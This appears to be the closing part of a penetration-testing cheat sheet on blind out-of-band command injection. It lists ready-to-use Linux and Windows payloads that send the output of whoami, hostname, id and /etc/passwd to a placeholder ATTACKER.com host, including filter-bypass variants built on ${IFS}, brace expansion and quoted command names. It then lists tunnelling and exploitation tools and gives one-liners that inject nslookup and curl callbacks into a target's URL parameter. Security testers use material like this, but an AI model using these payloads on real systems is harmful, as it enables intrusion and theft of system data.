; curl "http://ATTACKER.com/e?u=$(whoami)&h=$(hostname)"
; wget http://ATTACKER.com/$(whoami) -O /dev/null -q

# === LINUX — Data Exfiltration (POST) ===
; curl -X POST -d "$(whoami)" http://ATTACKER.com/c
; curl -X POST -d "$(cat /etc/passwd)" http://ATTACKER.com/c
; curl -X POST -d "$(cat /etc/passwd|base64 -w0)" http://ATTACKER.com/c
; curl -F "f=@/etc/passwd" http://ATTACKER.com/u
; wget --post-data="$(id)" http://ATTACKER.com/c -O /dev/null

# === LINUX — With Bypass ===
;curl${IFS}http://ATTACKER.com/$(whoami)
;{curl,http://ATTACKER.com/$(whoami)}
;c'u'r'l' http://ATTACKER.com/$(whoami)
;c\ur\l http://ATTACKER.com/$(whoami)

# === WINDOWS — HTTP Exfiltration ===
& powershell IWR http://ATTACKER.com/%USERNAME%
& powershell -c "(New-Object Net.WebClient).DownloadString('http://ATTACKER.com/'+(whoami))"
& certutil -urlcache -split -f http://ATTACKER.com/%USERNAME% null
& powershell -c "IWR http://ATTACKER.com/c -Method POST -Body (whoami)"
```

::

---

## Tools & Resources

### Primary Tools

::field-group
  ::field{name="Burp Collaborator" type="string"}
  Built into Burp Suite Professional. Provides DNS, HTTP, and SMTP interaction logging with unique per-test subdomains. The gold standard for OOB testing.
  `Burp > Menu > Burp Collaborator Client`
  ::

  ::field{name="Interactsh (ProjectDiscovery)" type="string"}
  Free, open-source alternative to Burp Collaborator. Supports DNS, HTTP, SMTP, LDAP, and more. Can be self-hosted.
  `https://github.com/projectdiscovery/interactsh`
  ::

  ::field{name="Commix" type="string"}
  Automated command injection exploitation tool with built-in OOB techniques including DNS and HTTP exfiltration.
  `https://github.com/commixproject/commix`
  ::

  ::field{name="DNSBin / RequestBin" type="string"}
  Web-based services for capturing DNS and HTTP callbacks. Useful for quick OOB testing without infrastructure setup.
  `https://requestbin.com` / `https://webhook.site`
  ::

  ::field{name="Responder" type="string"}
  LLMNR/NBT-NS/MDNS poisoner and SMB/HTTP/FTP/LDAP rogue server. Captures NTLM hashes from SMB-based OOB.
  `https://github.com/lgandx/Responder`
  ::

  ::field{name="dnscat2" type="string"}
  DNS tunneling tool for establishing command-and-control channels over DNS when other protocols are blocked.
  `https://github.com/iagox86/dnscat2`
  ::

  ::field{name="Iodine" type="string"}
  DNS tunnel tool for tunneling IPv4 data through DNS servers. Useful for establishing connectivity when only DNS egress is available.
  `https://github.com/yarrick/iodine`
  ::

  ::field{name="Canarytokens" type="string"}
  Free service for generating DNS, HTTP, and other tokens that notify when triggered.
  `https://canarytokens.org`
  ::

  ::field{name="ngrok" type="string"}
  Instant public URL tunnel to local servers. Useful for receiving OOB HTTP callbacks without a public server.
  `https://ngrok.com`
  ::
::

### References

::field-group
  ::field{name="OWASP Command Injection" type="string"}
  `https://owasp.org/www-community/attacks/Command_Injection`
  ::

  ::field{name="PortSwigger Blind OS Command Injection" type="string"}
  `https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band`
  ::

  ::field{name="HackTricks Command Injection" type="string"}
  `https://book.hacktricks.wiki/en/pentesting-web/command-injection.html`
  ::

  ::field{name="PayloadsAllTheThings — Command Injection" type="string"}
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection`
  ::

  ::field{name="RevShells — Reverse Shell Generator" type="string"}
  `https://www.revshells.com`
  ::

  ::field{name="GTFOBins" type="string"}
  Unix binaries exploitable for file read, command execution, reverse shells, and data exfiltration.
  `https://gtfobins.github.io`
  ::

  ::field{name="LOLBAS (Windows)" type="string"}
  Living Off The Land Binaries for Windows — certutil, bitsadmin, mshta, regsvr32, etc.
  `https://lolbas-project.github.io`
  ::

  ::field{name="CWE-78 OS Command Injection" type="string"}
  `https://cwe.mitre.org/data/definitions/78.html`
  ::

  ::field{name="DNS Exfiltration Techniques" type="string"}
  `https://attack.mitre.org/techniques/T1048/`
  ::
::

### Quick Reference Commands

```bash [One-Liners]
# Start interactsh and inject in one flow
interactsh-client 2>&1 | tee oob_log.txt &
OOB_DOMAIN=$(grep -oP '[a-z0-9]+\.oast\.\w+' oob_log.txt | head -1)
curl "http://target.com/page?input=;nslookup+\$(whoami).${OOB_DOMAIN}"

# Quick Burp Collaborator test
# Copy collaborator domain, then:
curl "http://target.com/page?input=;nslookup+test.COLLAB_DOMAIN"
# Poll collaborator for interaction

# DNS listener + injection
sudo tcpdump -i eth0 port 53 -l &
curl "http://target.com/page?input=;nslookup+\$(whoami).attacker.com"

# HTTP listener + injection
python3 -m http.server 80 &
curl "http://target.com/page?input=;curl+http://ATTACKER_IP/\$(whoami)"

# Mass OOB test with ffuf
ffuf -u "http://target.com/page?input=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection-commix.txt \
  -mc all -fw 0
# (Check OOB listener for interactions regardless of response)

# Commix quick OOB test
commix -u "http://target.com/page?input=test" --technique=E --batch
```